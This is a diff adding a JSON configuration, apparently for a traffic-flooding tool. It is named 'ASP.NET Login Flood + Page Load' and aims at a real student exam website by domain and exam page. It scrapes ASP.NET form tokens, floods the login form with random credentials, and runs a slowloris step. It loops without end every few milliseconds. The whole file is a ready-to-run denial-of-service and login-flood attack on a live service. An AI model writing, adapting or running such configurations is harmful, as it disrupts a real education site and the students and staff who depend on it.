@@ -1,0 +1,46 @@
+{
+  "name": "ASP.NET Login Flood + Page Load",
+  "base_url": "https://behsamooz.ir",
+  "steps": [
+    {
+      "action": "get",
+      "path": "/student/run-descriptive-exam/dbe11389-6684-44d6-a2ce-8022f49a889b",
+      "extract": {
+        "viewstate": "__VIEWSTATE",
+        "eventvalidation": "__EVENTVALIDATION"
+      }
+    },
+    {
+      "action": "post",
+      "path": "/student/run-descriptive-exam/dbe11389-6684-44d6-a2ce-8022f49a889b",
+      "data": {
+        "__VIEWSTATE": "{{viewstate}}",
+        "__EVENTVALIDATION": "{{eventvalidation}}",
+        "ctl00$ContentPlaceHolder1$txtUserName": "{{rand_user}}",
+        "ctl00$ContentPlaceHolder1$txtPassword": "{{rand_pass}}",
+        "ctl00$ContentPlaceHolder1$btnLogin": "ورود"
+      },
+      "expect": [302, 200]
+    },
+    {
+      "action": "get",
+      "path": "/FirstPages/Student.aspx",
+      "expect": [200, 302]
+    },
+    {
+      "action": "get",
+      "path": "/FirstPages/Default.aspx",
+      "expect": [200, 302]
+    },
+    {
+      "action": "slowloris",
+      "path": "/student/run-descriptive-exam/dbe11389-6684-44d6-a2ce-8022f49a889b"
+    },
+    {
+      "action": "sleep",
+      "ms": 50
+    }
+  ],
+  "loop": true,
+  "delay_ms": 10
+}
